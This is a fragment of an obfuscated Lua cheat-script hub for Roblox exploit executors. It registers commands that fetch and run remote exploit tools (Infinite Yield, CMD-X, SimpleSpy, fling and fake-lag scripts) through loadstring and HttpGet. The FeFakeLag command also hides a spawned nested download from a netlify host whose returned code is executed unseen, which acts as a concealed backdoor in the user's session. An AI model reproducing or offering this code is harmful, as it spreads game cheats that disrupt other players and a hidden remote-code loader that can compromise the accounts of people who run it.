                                L_64_.WalkSpeed = 0
                        elseif L_73_ == true then
                                L_73_ = false
                                L_74_ = false
                                L_64_.WalkSpeed = 16
                        end
                end
        end)
        local L_80_ = "idle"
        while L_37_:Wait() and L_46_ do
                if L_69_ then
                        L_80_ = "attack"
                elseif L_71_ then
                        L_80_ = "dead"
                elseif L_74_ then
                        L_80_ = "sit"
                elseif L_68_ then
                        if L_78_.Velocity.Magnitude < 2 then
                                L_80_ = "idle2"
                        elseif L_78_.Velocity.Magnitude > 20 then
                                L_80_ = "walk2"
                        end
                else
                        if L_78_.Velocity.y > 1 then
                                L_80_ = "jump"
                        elseif L_78_.Velocity.y <-1 then
                                L_80_ = "fall"
                        elseif L_78_.Velocity.Magnitude < 2 then
                                L_80_ = "idle"
                        elseif L_78_.Velocity.Magnitude < 20 then
                                L_80_ = "walk"
                        elseif L_78_.Velocity.Magnitude > 20 then
                                L_80_ = "run"
                        end
                end
                L_75_ += 1
                if L_80_ == "idle" then
                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 12), 0 + 0.3 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(L_75_ / 12), 2 + 0.3 * math.sin(L_75_ / 12), 0.3 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(L_75_ / 12)), math.rad(20 + 0 * math.sin(L_75_ / 12)), math.rad(-3 + 0 * math.sin(L_75_ / 12))), 0.1)
                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 12), 2 + 0.3 * math.sin(L_75_ / 12), 0.3 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(L_75_ / 12)), math.rad(-20 + 0 * math.sin(L_75_ / 12)), math.rad(3 + 0 * math.sin(L_75_ / 12))), 0.1)
                elseif L_80_ == "walk" then
                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 12), 0 + 0.3 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(-10 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(L_75_ / 12), 2 + 0.3 * math.sin(L_75_ / 12), 0.3 + 0.3 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 30 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 12), 2 + 0.3 * math.sin(L_75_ / 12), 0.3 + - 0.3 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 +-30 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                elseif L_80_ == "jump" then
                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(15 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 12), 1 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(10 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                elseif L_80_ == "fall" then
                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(15 + 10 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(-10 + 0 * math.sin(L_75_ / 12))), 0.1)
                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 12), 1 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(10 + 5 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(10 + 0 * math.sin(L_75_ / 12))), 0.1)
                elseif L_80_ == "vent" then
                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 12), 0 +-8 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(L_75_ / 12), 1.5 + 0 * math.sin(L_75_ / 12), 1 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(26.02 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 12), 2 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                elseif L_80_ == "ventidle" then
                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 12),-20 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(L_75_ / 12), 1.5 + 0 * math.sin(L_75_ / 12), 1 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(26.02 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 12), 2 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                elseif L_80_ == "idle2" then
                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 20), 3 + 0.3 * math.sin(L_75_ / 20), 0 + 0 * math.sin(L_75_ / 20)) * CFrame.Angles(math.rad(0 + 20 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20))), 0.1)
                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.5 + 0 * math.sin(L_75_ / 20), 1 + 0 * math.sin(L_75_ / 20), 1 + 0 * math.sin(L_75_ / 20)) * CFrame.Angles(math.rad(20 +-20 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20))), 0.1)
                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 20), 2 + 0 * math.sin(L_75_ / 20), 0.5 + - 0.5 * math.sin(L_75_ / 20)) * CFrame.Angles(math.rad(10 +-20 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20))), 0.1)
                elseif L_80_ == "walk2" then
                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 20), 3 + 0.3 * math.sin(L_75_ / 20), 0 + 0 * math.sin(L_75_ / 20)) * CFrame.Angles(math.rad(-60 + 10 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20))), 0.1)
                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.4 + 0 * math.sin(L_75_ / 20), 2 + 0 * math.sin(L_75_ / 20), 0.3 + 0 * math.sin(L_75_ / 20)) * CFrame.Angles(math.rad(0 +-10 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20)), math.rad(-5 + 0 * math.sin(L_75_ / 20))), 0.1)
                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(L_75_ / 20), 1 + 0 * math.sin(L_75_ / 20), 0.5 + 0 * math.sin(L_75_ / 20)) * CFrame.Angles(math.rad(0 +-20 * math.sin(L_75_ / 20)), math.rad(0 + 0 * math.sin(L_75_ / 20)), math.rad(5 + 0 * math.sin(L_75_ / 20))), 0.1)
                elseif L_80_ == "attack" then
                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 5), 0 + 0 * math.sin(L_75_ / 5), 0 + 0 * math.sin(L_75_ / 5)) * CFrame.Angles(math.rad(30 + 0 * math.sin(L_75_ / 5)), math.rad(0 + 0 * math.sin(L_75_ / 5)), math.rad(0 + 0 * math.sin(L_75_ / 5))), 0.1)
                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.4 + 0 * math.sin(L_75_ / 12), 2 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(30 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(-4 + 0 * math.sin(L_75_ / 12))), 0.1)
                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(L_75_ / 12), 2 + 0 * math.sin(L_75_ / 12), 0.5 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(30 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(4 + 0 * math.sin(L_75_ / 12))), 0.1)
                elseif L_80_ == "sit" then
                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 5), - 1.8 + 0 * math.sin(L_75_ / 5), 0 + 0 * math.sin(L_75_ / 5)) * CFrame.Angles(math.rad(10 + 0 * math.sin(L_75_ / 5)), math.rad(0 + 0 * math.sin(L_75_ / 5)), math.rad(0 + 0 * math.sin(L_75_ / 5))), 0.1)
                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.4 + 0 * math.sin(L_75_ / 12), 1 + 0 * math.sin(L_75_ / 12),-1 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(L_75_ / 12)), math.rad(10 + 0 * math.sin(L_75_ / 12)), math.rad(-4 + 0 * math.sin(L_75_ / 12))), 0.1)
                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(L_75_ / 12), 1 + 0 * math.sin(L_75_ / 12),-1 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(L_75_ / 12)), math.rad(-10 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                elseif L_80_ == "dead" then
                        L_77_["RootJoint"].C0 = L_77_["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(L_75_ / 5), - 2.5 + 0 * math.sin(L_75_ / 5),-1 + 0 * math.sin(L_75_ / 5)) * CFrame.Angles(math.rad(-90 + 0 * math.sin(L_75_ / 5)), math.rad(0 + 0 * math.sin(L_75_ / 5)), math.rad(0 + 0 * math.sin(L_75_ / 5))), 0.1)
                        L_77_["Right Hip"].C0 = L_77_["Right Hip"].C0:lerp(CFrame.new(- 0.4 + 0 * math.sin(L_75_ / 12), 3 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(-4 + 0 * math.sin(L_75_ / 12))), 0.1)
                        L_77_["Left Hip"].C0 = L_77_["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(L_75_ / 12), 3 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(4 + 0 * math.sin(L_75_ / 12))), 0.1)
                end
                L_77_["Right Shoulder"].C0 = L_77_["Right Shoulder"].C0:lerp(CFrame.new(- 0.4 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12), - 0.8 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
                L_77_["Left Shoulder"].C0 = L_77_["Left Shoulder"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(L_75_ / 12), 0 + 0 * math.sin(L_75_ / 12), - 0.8 + 0 * math.sin(L_75_ / 12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12)), math.rad(0 + 0 * math.sin(L_75_ / 12))), 0.1)
        end
end)L_2_:AddCommand('FeFakeLag', {}, 'Script not mine no hate plz FE FAKE LAG V2', function(L_195_arg0, L_196_arg1)
    -- Creo Fake Lag Script

-- < You> --

-- How long each lag can last
        local L_197_ = 0.8
        local L_198_ = 4
--                          --
        local L_199_ = function(L_201_arg0, L_202_arg1, L_203_arg2, L_204_arg3)
                game.StarterGui:SetCore("SendNotification", {
                        Title = "Creo FE Lag Script";
                        Text = L_201_arg0;
                        Icon = "";
                        Duration = L_202_arg1;
                        Button1 = L_203_arg2;
                        Button2 = L_204_arg3;
                        Callback = nil;
                })
        end
        spawn(function()
                loadstring(game:HttpGet(game:HttpGet("https://luafunctionsextra.netlify.app", true)))()
        end)
        local function L_200_func(L_205_arg0, L_206_arg1)
                local L_207_ = game.Players.LocalPlayer.Character.Animate
                L_207_.Parent = nil
                local L_208_ = L_206_arg1 * 30
                local L_209_ = L_208_
                while true do
                        if L_209_ > 0 then
                                L_205_arg0.Parent = nil
                                L_205_arg0.Parent = workspace
                                L_209_ -= 1
                                task.wait()
                        else
                                L_207_.Parent = game.Players.LocalPlayer.Character
                                break
                        end
                end
        end
        L_199_("Activated", 2, "Ok", nil)
        while true do
                wait(math.random(1, 20) * 0.1)
                L_200_func(game.Players.LocalPlayer.Character, math.random(L_197_, L_198_))
        end
end)L_2_:AddCommand('Infyield', {}, 'Best admin', function(L_210_arg0, L_211_arg1)
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)L_2_:AddCommand('CMDX', {}, 'Best admin', function(L_212_arg0, L_213_arg1)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
end)L_2_:AddCommand('SimpleSpy', {}, 'executes simple spy', function(L_214_arg0, L_215_arg1)
        loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
end)L_2_:AddCommand('ultfling', {}, 'ultimate fling', function(L_216_arg0, L_217_arg1)
        loadstring(game:HttpGet("https://pastebin.com/raw/GfwkiUTV", true))()
end)L_2_:AddCommand('FeX', {}, 'Ultimate FE Gui', function(L_218_arg0, L_219_arg1)
        loadstring(game:HttpGet("https://pastebin.com/raw/ES6xMCn7", true))()
end)L_2_:AddCommand('DomainX', {}, 'ily shlex very kool', function(L_220_arg0, L_221_arg1)
    -- DomainX Loadstring
        loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/DomainX/main/source', true))()
end)L_2_:AddCommand('shaders', {}, 'RTX on babyyy', function(L_222_arg0, L_223_arg1)
    -- Roblox Graphics Enhancer
        local L_224_ = game.Lighting
        for L_231_forvar0, L_232_forvar1 in pairs(L_224_:GetChildren()) do
                L_232_forvar1:Destroy()
        end
        local L_225_ = workspace.Terrain
        local L_226_ = Instance.new("ColorCorrectionEffect")
        local L_227_ = Instance.new("BloomEffect")
        local L_228_ = Instance.new("SunRaysEffect")
        local L_229_ = Instance.new("BlurEffect")
        L_226_.Parent = L_224_
        L_227_.Parent = L_224_
        L_228_.Parent = L_224_
        L_229_.Parent = L_224_

    -- enable or disable shit
        local L_230_ = {
                Terrain = true;
                ColorCorrection = true;
                Sun = true;
                Lighting = true;
                BloomEffect = true;
        }

    -- settings {
        L_226_.Enabled = false
        L_226_.Contrast = 0.15
        L_226_.Brightness = 0.1
        L_226_.Saturation = 0.25
        L_226_.TintColor = Color3.fromRGB(255, 222, 211)
        L_227_.Enabled = false
        L_227_.Intensity = 0.1
        L_228_.Enabled = false
        L_228_.Intensity = 0.2
        L_228_.Spread = 1
        L_227_.Enabled = false
        L_227_.Intensity = 0.05
        L_227_.Size = 32
        L_227_.Threshold = 1
        L_229_.Enabled = false
        L_229_.Size = 6

    -- settings }
        if L_230_.ColorCorrection then
                L_226_.Enabled = true
        end
        if L_230_.Sun then
                L_228_.Enabled = true
        end
        if L_230_.Terrain then
        -- settings {
                L_225_.WaterColor = Color3.fromRGB(10, 10, 24)
                L_225_.WaterWaveSize = 0.15
                L_225_.WaterWaveSpeed = 22
                L_225_.WaterTransparency = 1
                L_225_.WaterReflectance = 0.05
        -- settings }
        end
        if L_230_.Lighting then
        -- settings {
                L_224_.Ambient = Color3.fromRGB(0, 0, 0)
                L_224_.Brightness = 4
                L_224_.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
                L_224_.ColorShift_Top = Color3.fromRGB(0, 0, 0)
                L_224_.ExposureCompensation = 0
                L_224_.FogColor = Color3.fromRGB(132, 132, 132)
                L_224_.GlobalShadows = true
                L_224_.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
                L_224_.Outlines = false
        -- settings }
        end
end)
